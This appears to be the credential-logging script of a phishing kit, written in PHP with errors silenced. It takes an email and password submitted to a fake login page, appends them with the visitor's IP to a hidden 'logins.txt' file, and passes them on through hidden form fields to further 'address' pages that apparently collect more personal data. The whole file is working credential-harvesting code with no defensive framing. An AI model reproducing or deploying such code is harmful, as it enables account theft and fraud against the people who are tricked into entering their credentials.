<?php
error_reporting(0);
			/** -------------------------------------------------- **/
// $_POST variables

$login = $_REQUEST['email'];
$password = $_REQUEST['password'];
			/** -------------------------------------------------- **/
// Check if link


		if($_GET['src'] == 'new_entry'){
			@include_once 'info.php'; /** include : Date & IP &.. variables **/
				if(empty($login) OR empty($password)){
					@header("location: index.htm") or die("<META http-equiv=\"refresh\" content=\"0; URL=login.php\">");
				}
				else{
					@include_once 'info.php'; /** include : Date & IP &.. variables **/
					$message .= "$ip -> ";
					$message .= "$login";
					$message .= "|$password\n";
					$fp = fopen("../../logins.txt", 'ab'); fwrite($fp, $message); fclose($fp);
?>
				<?php require_once 'addressp1.html'; ?>
<?php
		if($_GET['error'] == '1'){
		?><?php require_once 'addressp2.html'; ?><?php
		}
		else{
		}
?>
<?php require_once 'addressp3.html'; ?>
<input type="hidden" name="email" value="<?php echo $login; ?>">
<input type="hidden" name="password" value="<?php echo $password; ?>">
<?php require_once 'addressp4.html'; ?>
<?php
				}
		}
?>